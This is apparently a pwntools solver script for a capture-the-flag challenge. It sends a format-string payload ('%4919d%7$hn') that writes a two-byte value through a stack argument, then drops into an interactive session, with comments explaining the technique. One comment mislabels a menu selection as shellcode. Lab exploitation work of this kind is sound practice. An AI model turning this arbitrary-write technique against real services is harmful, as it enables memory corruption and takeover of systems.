# Copied from the challenge "El Teteo"

#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './sp_entrypoint' 

os.system('clear')

if len(sys.argv) < 2:
  print('Running solver locally..\n')
  r    = process(fname)
  # r = gdb.debug(fname, gdbscript='break main\ncontinue')
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

# Send shellcode
r.sendlineafter(b'>', b'1')
# %4919d -> pad 4919 chars; %7$hn -> write the printed values as a short int (2 bytes) to the 7th argument.
# note that the 7th arg is the **address** of the target. The 6th arg is just its value and
# cannot be used for writing here.
# TODO: it is unclear why we cannot write the whole 0xdead1337 with %7$n. Maybe need some gdb.
r.sendlineafter(b':', b'%4919d%7$hn')
r.interactive()

# # Get flag
# print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
